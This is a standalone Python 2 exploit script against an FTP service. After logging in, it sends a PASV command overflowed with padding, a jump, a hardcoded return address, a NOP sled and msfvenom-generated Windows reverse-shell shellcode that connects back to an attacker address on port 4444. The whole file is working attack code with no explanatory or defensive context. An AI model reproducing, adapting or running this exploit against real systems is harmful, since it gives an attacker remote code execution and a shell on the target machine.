#!/usr/bin/python

import sys,os,socket


# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -b '\x00' EXITFUNC=thread
shellcode = ("\xb8\x78\x3f\x29\x22\xdb\xd8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x0e\x03\x3a\x31\xcb\xd7\x46\xa5\x89"
"\x18\xb6\x36\xee\x91\x53\x07\x2e\xc5\x10\x38\x9e\x8d\x74\xb5"
"\x55\xc3\x6c\x4e\x1b\xcc\x83\xe7\x96\x2a\xaa\xf8\x8b\x0f\xad"
"\x7a\xd6\x43\x0d\x42\x19\x96\x4c\x83\x44\x5b\x1c\x5c\x02\xce"
"\xb0\xe9\x5e\xd3\x3b\xa1\x4f\x53\xd8\x72\x71\x72\x4f\x08\x28"
"\x54\x6e\xdd\x40\xdd\x68\x02\x6c\x97\x03\xf0\x1a\x26\xc5\xc8"
"\xe3\x85\x28\xe5\x11\xd7\x6d\xc2\xc9\xa2\x87\x30\x77\xb5\x5c"
"\x4a\xa3\x30\x46\xec\x20\xe2\xa2\x0c\xe4\x75\x21\x02\x41\xf1"
"\x6d\x07\x54\xd6\x06\x33\xdd\xd9\xc8\xb5\xa5\xfd\xcc\x9e\x7e"
"\x9f\x55\x7b\xd0\xa0\x85\x24\x8d\x04\xce\xc9\xda\x34\x8d\x85"
"\x2f\x75\x2d\x56\x38\x0e\x5e\x64\xe7\xa4\xc8\xc4\x60\x63\x0f"
"\x2a\x5b\xd3\x9f\xd5\x64\x24\xb6\x11\x30\x74\xa0\xb0\x39\x1f"
"\x30\x3c\xec\xb0\x60\x92\x5f\x71\xd0\x52\x30\x19\x3a\x5d\x6f"
"\x39\x45\xb7\x18\xd0\xbc\x50\xe7\x8d\xbf\xaa\x8f\xcf\xbf\xbb"
"\x13\x59\x59\xd1\xbb\x0f\xf2\x4e\x25\x0a\x88\xef\xaa\x80\xf5"
"\x30\x20\x27\x0a\xfe\xc1\x42\x18\x97\x21\x19\x42\x3e\x3d\xb7"
"\xea\xdc\xac\x5c\xea\xab\xcc\xca\xbd\xfc\x23\x03\x2b\x11\x1d"
"\xbd\x49\xe8\xfb\x86\xc9\x37\x38\x08\xd0\xba\x04\x2e\xc2\x02"
"\x84\x6a\xb6\xda\xd3\x24\x60\x9d\x8d\x86\xda\x77\x61\x41\x8a"
"\x0e\x49\x52\xcc\x0e\x84\x24\x30\xbe\x71\x71\x4f\x0f\x16\x75"
"\x28\x6d\x86\x7a\xe3\x35\xa6\x98\x21\x40\x4f\x05\xa0\xe9\x12"
"\xb6\x1f\x2d\x2b\x35\x95\xce\xc8\x25\xdc\xcb\x95\xe1\x0d\xa6"
"\x86\x87\x31\x15\xa6\x8d")

payload = ''
payload += 'A' * 100
payload += '\xeb\x30'
payload += 'A' * 21
payload += '\x70\x6D\x95\x7C'
payload += '\x90' * 30
payload += shellcode
payload += 'C' * (2500 - len(payload))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('192.168.1.26', 21))

sock.recv(1024)
sock.send('USER ftp\r\n')
print sock.recv(1024)
sock.send('PASS ftp\r\n')
print sock.recv(1024)
sock.send('PASV ' + payload + '\r\n')
print sock.recv(1024)
sock.close()